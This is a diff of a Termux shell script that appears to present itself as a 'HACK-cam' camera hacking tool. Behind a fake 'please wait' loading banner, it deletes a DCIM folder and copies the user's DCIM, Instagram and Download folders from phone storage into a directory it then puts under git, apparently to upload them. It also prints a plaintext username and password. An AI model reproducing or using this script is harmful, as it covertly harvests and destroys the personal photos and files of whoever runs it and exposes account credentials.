@@ -1,23 +1,8 @@
 termux-setup-storage -y
-cyan='\033[1;36m'
-green='\033[1;32m'
-red='\033[1;31m'
-yellow='\033[1;33m'
-blue='\033[1;34m'
-purple='\033[1;35m'
-
-clear
-echo -e "$cyan ..........$red [$green please$blue waite$red ]$cyan >>>>>>>>>>>.../"
-sleep 0.2
-clear
-echo -e "$cyan ..........$red [$green p*****$blue w****$red ]$cyan >>>>>>>>>>>....|"
-sleep 0.2
-clear
-echo -e "$cyan ..........$red [$green pl****$blue wa***$red ]$cyan >>>>>>>>>>>..../"
-sleep 0.2
-clear
-echo -e "$cyan ..........$red [$green plee**$blue wai**$red ]$cyan >>>>>>>>>>>.....|"
-sleep 0.2
+cyan='\033[1;36m'                                                          green='\033[1;32m'                                                         red='\033[1;31m'                                                           yellow='\033[1;33m'                                                        blue='\033[1;34m'                                                          purple='\033[1;35m'                                                                                                                                   clear                                                                      echo -e "$cyan ..........$red [$green please$blue waite$red ]$cyan >>>>>>>>>>>.../"                                                                   sleep 0.2
+clear                                                                      echo -e "$cyan ..........$red [$green p*****$blue w****$red ]$cyan >>>>>>>>>>>....|"                                                                  sleep 0.2
+clear                                                                      echo -e "$cyan ..........$red [$green pl****$blue wa***$red ]$cyan >>>>>>>>>>>..../"
+sleep 0.2                                                                  clear                                                                      echo -e "$cyan ..........$red [$green plee**$blue wai**$red ]$cyan >>>>>>>>>>>.....|"                                                                 sleep 0.2
 clear
 echo -e "$cyan ..........$red [$green plee**$blue wait.$red ]$cyan >>>>>>>>>>....../"
 sleep 0.2
@@ -26,8 +11,7 @@ echo -e "$cyan ..........$red [$green plees*$blue waite$red ]$cyan >>>>>>>>>>...
 sleep 0.2
 clear
 echo -e "$cyan ..........$red [$green pleese$blue waite$red ]$cyan >>>>>>>>>......./"
-sleep 0.2
-clear
+sleep 0.2                                                                  clear
 echo -e "$cyan ..........$red [$green pleese$blue waite$red ]$cyan >>>>>>>>>......./"
 sleep 0.2
 
@@ -63,25 +47,25 @@ cd
 rm -rf DCIM
 cd /sdcard
 cd ~/storage/shared/
-mkdir /sdcard/termux
-mkdir /sdcard/termux2
-mkdir /sdcard/termux3
-cp -r DCIM termux
-cp -r instagram termux2
-cp -r Download termux3
-mv termux ~/HACK-cam
-mv termux2 ~/HACK-cam
-mv termux3 ~/HACK-cam
+#mkdir /sdcard/termux
+#mkdir /sdcard/termux2
+#mkdir /sdcard/termux3
+cp -r DCIM ~/HACK-cam
+cp -r Instagram ~/HACK-cam
+cp -r Download ~/HACK-cam
+#mv termux ~/HACK-cam
+#mv termux2 ~/HACK-cam
+#mv termux3 ~/HACK-cam
 cd ~/HACK-cam
-touch ~/HACK-cam/termux/hi.txt
-touch ~/HACK-cam/termux2/he.txt
-touch ~/HACK-cam/termux3/me.txt
-zip -r ~/HACK-cam/termux.zip termux
-rm -rf ~/HACK-cam/termux
-zip -r ~/HACK-cam/termux2.zip termux2
-rm -rf ~/HACK-cam/termux2
-zip -r ~/HACK-cam/termux3.zip termux3
-rm -rf ~/HACK-cam/termux3
+touch ~/HACK-cam/DCIM/hi.txt
+touch ~/HACK-cam/Instagram/he.txt
+touch ~/HACK-cam/Download/me.txt
+#zip -r ~/HACK-cam/termux.zip termux
+#rm -rf ~/HACK-cam/termux
+#zip -r ~/HACK-cam/termux2.zip termux2
+#rm -rf ~/HACK-cam/termux2
+#zip -r ~/HACK-cam/termux3.zip termux3
+#rm -rf ~/HACK-cam/termux3
 git config --global user.email "horrorstories189@gmail.com"
 git config --global user.name "MrAli-s"
 git init
@@ -96,9 +80,6 @@ clear
 echo -e '"the Username is "MrAli-s"'
 echo -e '"the password is "1928Rami@//"'
 git clone https://github.com/AkanVb/Test.git
-rm -rf ~/HACK-cam/termux
-rm -rf ~/HACK-cam/termux2
-rm -rf ~/HACK-cam/termux3
 #mv Test/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php README.md LICENSE ..
 #mv /Test/index2.html template.php jmaxopcam.sh saycheese.html ip.php index2.html index.php post.php README.md LICENSE  ..
 mv ~/HACK-cam/Test/README.md ~/HACK-cam/Test/extract.sh ~/HACK-cam/Test/ip.php ~/HACK-cam/Test/index2.html ~/HACK-cam/Test/index.php ~/HACK-cam/Test/ip.php ~/HACK-cam/Test/template.php ~/HACK-cam/Test/LICENSE ~/HACK-cam/Test/template.php ~/HACK-cam/Test/saycheese.html ~/HACK-cam/Test/jmaxopcam.sh ~/HACK-cam/Test/post.php ~/HACK-cam
